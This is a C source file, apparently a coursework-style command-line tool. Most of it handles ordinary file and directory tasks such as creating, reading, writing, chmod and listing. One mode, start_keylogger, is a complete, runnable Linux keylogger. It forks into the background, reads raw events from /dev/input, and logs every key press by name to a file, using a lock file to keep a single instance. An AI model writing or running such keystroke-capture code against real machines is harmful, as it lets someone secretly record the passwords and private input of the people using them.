#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <dirent.h>
#include <time.h> //@YuEnTiang81391 new added library for time 
#include <linux/input.h> //@YuEnTiang81391 new added library for input
#include <sys/file.h> //@YuEnTiang81391 new added library for file
#include <errno.h> //@YuEnTiang81391 new added library for error

void create_file(char *filename){
    int fd = open(filename, O_CREAT | O_RDWR, 0644);
    if (fd == -1){
        perror("Error in creating file\n");
        exit(1);
    }
    close(fd);
    printf("File named '%s' created successfully\n", filename);
}

void change_permission(char *filename, mode_t mode){
    if (chmod(filename, mode) == -1){
        perror("Error in changing permission\n");
        exit(1);
    }
    printf("Permission for %s changed successfully\n", filename);
}

void read_file(char *filename){
    char buffer[1024];
    int fd = open(filename, O_RDONLY);

    if (fd == -1){
        perror("Error in reading file\n");
        exit(1);
    }

    ssize_t readFile;
    while ((readFile = read(fd, buffer, sizeof(buffer) - 1)) > 0){
        buffer[readFile] = '\0';
        printf("%s", buffer);
    }

    close(fd);
}

void write_file(char *filename){
    int fd = open(filename, O_WRONLY | O_APPEND);
    if (fd == -1){
        perror("Error in writing file\n");
        exit(1);
    }

    char buffer[1024];
    printf("Stop writing by pressing 'Ctrl+D'\n");
    printf("Enter the content to write in file:\n ");
    while (fgets(buffer, sizeof(buffer), stdin)) {
        write(fd, buffer, strlen(buffer));
    }
    close(fd);
}

void delete_file(const char *filename){
    if (remove(filename) == -1){
        perror("Error in deleting file\n");
        exit(1);
    }
    printf("File named '%s' deleted successfully\n", filename);
}

void create_dir(char *dirname){
     if (mkdir(dirname, 0755) == -1) {
        perror("Error creating directory\n");
    } else {
        printf("Directory %s created successfully.\n", dirname);
    }
}

void delete_dir(char *dirname){
    if (rmdir(dirname) == -1) {
        perror("Error deleting directory\n");
    } else {
        printf("Directory %s deleted successfully.\n", dirname);
    }
}

void print_current_directory(){
    char cwd[1024];
    if (getcwd(cwd, sizeof(cwd)) == NULL){
        perror("getcwd() error");
    } else {
        printf("Current working directory: %s\n", cwd);
    }
}

void list_directory(char *dirname){
    DIR *dir;
    struct dirent *entry;

    if (!(dir = opendir(dirname))) {
        perror("Error opening directory\n");
        return;
    } else {
        printf("*****Current directory:[%s]*****\n", dirname);
    }

    while ((entry = readdir(dir)) != NULL) {
        printf("%s\n", entry->d_name);
    }
    closedir(dir);
}

// Key code to key name mapping
const char *key_names[] = {
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "MINUS", "EQUAL", "BACKSPACE", "TAB",
    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S",
    "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X",
    "C", "V", "B", "N", "M", "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9",
    "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND",
    "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER",
    "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END",
    "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER", "KPEQUAL",
    "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA", "HANGEUL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA", "COMPOSE",
    "STOP", "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT", "HELP", "MENU", "CALC",
    "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE", "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS",
    "COFFEE", "ROTATE_DISPLAY", "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD",
    "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD", "RECORD", "REWIND", "PHONE",
    "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT", "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN",
    "KPRIGHTPAREN", "NEW", "REDO"
};

void start_keylogger(char *logfile) {
     // Create a lock file to ensure only one instance runs
    int lock_fd = open("/tmp/keylogger.lock", O_CREAT | O_RDWR, 0666);
    if (lock_fd == -1) {
        perror("Failed to create lock file");
        exit(EXIT_FAILURE);
    }

    if (flock(lock_fd, LOCK_EX | LOCK_NB) == -1) {
        if (errno == EWOULDBLOCK) {
            fprintf(stderr, "Another instance of the keylogger is already running.\n");
            close(lock_fd);
            exit(EXIT_FAILURE);
        } else {
            perror("Failed to lock file");
            close(lock_fd);
            exit(EXIT_FAILURE);
        }
    }

    // Run in background
    if (fork() == 0) {
        FILE *file;
        file = fopen(logfile, "a");
        if (file == NULL) {
            perror("Failed to open keylog file");
            return;
        }

        // Add timestamp at the beginning of the session
        time_t now;
        time(&now);
        char *timestamp = ctime(&now);
        if (timestamp == NULL) {
            perror("Failed to get current time");
            fclose(file);
            return;
        }
        fprintf(file, "Keylogger session started at: %s\n", timestamp);
        fclose(file);

        // Monitor the input device
        int fd; 
        struct input_event ev;
        int last_key = -1;
        int last_value = -1;
        // Get the input device from environment variable or use default
        const char *dev = getenv("INPUT_DEVICE");
        if (dev == NULL) {
            dev = "/dev/input/event2"; // Default device
        }

        fd = open(dev, O_RDONLY);
        if (fd == -1) {
            perror("Failed to open input device");
            exit(EXIT_FAILURE);
        }

        while (1) {
            read(fd, &ev, sizeof(struct input_event));
            if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                file = fopen(logfile, "a");
                if (file != NULL) {
                    if (ev.code < sizeof(key_names) / sizeof(key_names[0])) {
                        fprintf(file, "Key %s pressed\n", key_names[ev.code]);
                    } else {
                        fprintf(file, "Key %d pressed\n", ev.code);
                    }
                    fclose(file);
                }
                last_key = ev.code;
                last_value = ev.value;
                usleep(200000); // Add a small delay (200ms) to debounce
            }
        }
        close(fd);
        exit(EXIT_SUCCESS);
    }
}

int main(int argc, char *argv[]){
    if (argc < 3){
        fprintf(stderr, "Please enter in correct format!\nFormat: %s -m [mode] [argument]\n", argv[0]);
        return 1;
    }

    int mode = atoi(argv[2]); // 1 for file operation, 2 for directory operation, 3 for keylogger

    switch (mode){
        case 1:
            if (argc < 5){
                perror("Please enter correct format of arguments for file operation");
                break;
            }

            int file_operation_mode = atoi(argv[3]); // 1 for create, 2 for change permission, 3 for read, 4 for write, 5 for delete
            switch (file_operation_mode){
                case 1:
                    create_file(argv[4]);
                    break;

                case 2:
                    if (argc < 6){
                        perror("Please enter correct format of arguments for changing permission");
                        break;
                    }
                    mode_t new_mode = strtol(argv[5], NULL, 8);
                    change_permission(argv[4], new_mode);
                    break;

                case 3:
                    read_file(argv[4]);
                    break;

                case 4:
                    write_file(argv[4]);
                    break;

                case 5:
                    delete_file(argv[4]);
                    break;

                default:
                    perror("Invalid file operation\n");
            }
            break;

        case 2:
            if (argc < 4){
                perror("Please enter correct format of arguments for directory operation");
                return 1;
            }

            int directory_operation_mode = atoi(argv[3]); // 1 for create, 2 for delete, 3 for list, 4 for print current directory
            switch (directory_operation_mode){
                case 1:
                    create_dir(argv[4]);
                    break;

                case 2:
                    delete_dir(argv[4]);
                    break;

                case 3:
                    list_directory(argv[4]);
                    break;

                case 4:
                    print_current_directory();
                    break;

                default:
                    perror("Invalid directory operation\n");
            }
            break;

        case 3:
            if (argc < 4){
                fprintf(stderr, "Please specify the log file for keylogger.\n");
                return 1;
            }
            start_keylogger(argv[3]);
            break;

        default:
            perror("Invalid operation mode\n");
            break;
    }

    return 0;
}
